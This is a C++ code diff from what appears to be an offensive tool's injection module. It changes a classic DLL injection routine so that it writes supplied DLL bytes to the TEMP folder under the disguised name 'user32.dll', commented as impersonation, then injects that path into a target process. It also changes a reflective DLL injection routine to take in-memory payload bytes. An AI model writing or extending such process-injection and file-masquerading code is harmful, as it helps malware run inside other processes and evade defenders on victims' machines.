@@ -85,14 +85,24 @@ namespace Technique::Injection::Helper
 namespace Technique::Injection
 {
     BOOL DLLInjection(
-        Procs::PPROCS   pProcs,
-        DWORD           dwPID,
-        LPVOID          lpDllPath,
-        size_t          dwDllPathSize
+        Procs::PPROCS pProcs,
+        DWORD dwPID,
+        std::vector<BYTE> bytes
     ) {
         HANDLE hProcess;
         HANDLE hThread;
         LPVOID lpRemoteBuffer;
+
+        // Set the temp file path
+        std::wstring wDllFileName = L"user32.dll"; // Impersonate the file name.
+        std::wstring wDllPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + wDllFileName;
+        size_t dwDllPathSize = (wDllPath.size() + 1) * sizeof(wchar_t);
+
+        // Write DLL file
+        if (!System::Fs::FileWrite(pProcs, wDllPath, bytes))
+        {
+            return FALSE;
+        }
 
         HANDLE hToken;
         TOKEN_PRIVILEGES priv = {0};
@@ -120,6 +130,7 @@ namespace Technique::Injection
         lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
             pProcs,
             hProcess,
+            nullptr,
             dwDllPathSize,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
@@ -134,7 +145,7 @@ namespace Technique::Injection
             pProcs,
             hProcess,
             lpRemoteBuffer,
-            lpDllPath,
+            (LPVOID)wDllPath.c_str(),
             dwDllPathSize,
             NULL
         )) {
@@ -209,11 +220,10 @@ namespace Technique::Injection
     }
 
     BOOL ReflectiveDLLInjection(
-        Procs::PPROCS   pProcs,
-        DWORD           dwPID,
-        LPCWSTR         lpDllPath
+        Procs::PPROCS pProcs,
+        DWORD dwPID,
+        std::vector<BYTE> bytes
     ) {        
-        std::vector<BYTE> bytes = System::Fs::FileRead(pProcs, lpDllPath);
         LPVOID lpBuffer = bytes.data();
         SIZE_T dwLength = bytes.size();
 
@@ -250,6 +260,7 @@ namespace Technique::Injection
         LPVOID lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
             pProcs,
             hProcess,
+            nullptr,
             dwLength,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
